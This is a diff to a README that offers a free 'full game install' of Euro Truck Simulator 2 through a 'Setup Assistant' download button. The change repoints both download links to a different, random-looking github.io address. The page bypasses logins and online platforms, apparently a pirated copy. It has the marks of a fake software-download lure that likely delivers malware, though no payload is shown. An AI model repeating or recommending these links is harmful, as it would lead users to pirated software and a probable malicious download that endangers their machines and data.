@@ -1,6 +1,6 @@
 # Euro Truck Simulator 2 — PC Full Game Install 
 
-[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://euro-track-simulator-2-pc.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/ETS2)
 
 ## ⚙️ How to Use
 
@@ -43,7 +43,7 @@ This installation guide helps you download and run **Euro Truck Simulator 2** on
 
 Ideal for users who want a clean install without third-party services or for deployment in restricted environments. Once installed, you can drive, manage deliveries, and upgrade your fleet — all without logging in or connecting to online platforms.
 
-[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://euro-track-simulator-2-pc.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/ETS2)
 
 ---
 
